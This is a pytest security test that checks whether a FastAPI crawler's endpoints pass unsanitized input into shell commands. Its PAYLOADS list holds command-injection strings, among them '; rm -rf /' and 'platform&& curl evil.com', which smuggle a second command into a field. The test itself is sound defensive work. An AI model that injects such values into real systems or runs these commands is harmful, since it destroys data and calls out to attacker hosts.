import pytest
from unittest.mock import patch, MagicMock
import subprocess


PAYLOADS = [
    "; rm -rf /",
    "$(whoami)",
    "`id`",
    "platform&& curl evil.com",
    "valid_platform",
]


@pytest.mark.parametrize("payload", PAYLOADS)
def test_shell_commands_never_include_unsanitized_input(payload):
    """Invariant: Shell commands never include unsanitized user input"""
    captured_calls = []

    original_run = subprocess.run
    original_popen = subprocess.Popen

    def mock_run(*args, **kwargs):
        captured_calls.append(("run", args, kwargs))
        return MagicMock(returncode=0)

    def mock_popen(*args, **kwargs):
        captured_calls.append(("popen", args, kwargs))
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.communicate.return_value = (b"", b"")
        mock_proc.poll.return_value = 0
        return mock_proc

    with patch("subprocess.run", side_effect=mock_run), \
         patch("subprocess.Popen", side_effect=mock_popen):
        try:
            from api.main import app
            from fastapi.testclient import TestClient
            client = TestClient(app)

            # Try various endpoints that might accept platform/config input
            client.post("/crawl", json={"platform": payload})
            client.post("/api/crawl", json={"platform": payload})
            client.get(f"/crawl/{payload}")
            client.post("/start", json={"platform": payload, "config": payload})
        except Exception:
            pass

    shell_metacharacters = [";", "&&", "||", "`", "$(", "|", ">", "<"]
    for call_type, args, kwargs in captured_calls:
        # If shell=True is used, the command must not contain unsanitized payload
        if kwargs.get("shell", False):
            cmd = args[0] if args else kwargs.get("args", "")
            if isinstance(cmd, str) and payload != "valid_platform":
                for meta in shell_metacharacters:
                    if meta in payload:
                        assert payload not in cmd, (
                            f"Unsanitized payload '{payload}' found in shell command: {cmd}"
                        )
        # If args are passed as a list, verify no element contains raw shell metacharacters from payload
        if args and isinstance(args[0], (list, tuple)):
            cmd_parts = args[0]
            joined = " ".join(str(p) for p in cmd_parts)
            if payload != "valid_platform":
                for meta in shell_metacharacters:
                    if meta in payload:
                        assert payload not in joined, (
                            f"Unsanitized payload '{payload}' found in command args: {cmd_parts}"
                        )